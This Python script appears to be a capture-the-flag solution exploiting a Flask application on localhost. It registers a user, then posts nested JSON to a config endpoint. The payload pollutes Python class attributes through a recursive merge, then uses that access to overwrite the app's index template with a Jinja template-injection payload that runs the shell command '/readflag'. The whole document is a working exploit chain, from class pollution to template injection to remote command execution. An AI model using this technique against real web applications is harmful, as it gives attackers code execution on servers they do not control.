import requests

URL = "http://localhost:8080/"

s = requests.session()
user = {
    "username": "foo",
    "password": "bar"
}
r = s.post(URL + "register", data=user)
r = s.post(URL + "login", data=user)

r = s.post(URL + "api/config", json={
    "__class__": {
        "merge_info": {
            "__kwdefaults__": {
                "depth": -9999
            }
        }
    }
})
print(r.text)

r = s.post(URL + "api/config", json={
    "__class__": {
        "__init__":{
            "__globals__": {
                "generate_password_hash": {
                    "__globals__": {
                        "os": {
                            "sys": {
                                "modules": {
                                    "app": {
                                        "CONFIG_TEMPLATE": "flask.log",
                                        "INDEX_TEMPLATE": "{{[].__class__.__class__.__subclasses__([].__class__.__class__)[0].register.__builtins__['__import__']('os').popen('/readflag').read()}}"
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
})
print(r.text)
r = s.get(URL, data=user)
r = s.get(URL + "config")
print(r.text)